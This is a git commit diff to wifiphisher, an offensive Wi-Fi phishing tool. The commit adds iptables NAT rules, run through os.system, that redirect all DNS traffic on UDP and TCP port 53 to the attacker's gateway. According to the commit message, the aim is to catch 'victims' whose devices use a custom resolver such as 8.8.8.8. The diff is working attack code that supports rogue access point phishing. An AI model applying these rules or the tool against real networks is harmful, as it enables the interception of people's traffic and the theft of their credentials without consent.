7970cc10e6a63f245b4ca4a7d5a974cafe35ffe3
Leonidas Vrachnis <leo.al.vra@gmail.com>
2016-06-18 20:30:43 +0300

    Add iptables rules for redicting all DNS requests to local DNS server
    usefull in cases where the "victim" is using custom DNS resolver (like 8.8.8.8)

--- wifiphisher/pywifiphisher.py
+++ wifiphisher/pywifiphisher.py
@@ -874,6 +874,14 @@ def run():
          % (NETWORK_GW_IP, PORT))
     )
     os.system(
+        ('iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination %s:%s'
+         % (NETWORK_GW_IP, 53))
+    )
+    os.system(
+        ('iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination %s:%s'
+         % (NETWORK_GW_IP, 53))
+    )
+    os.system(
         ('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination %s:%s'
          % (NETWORK_GW_IP, SSL_PORT))
     )
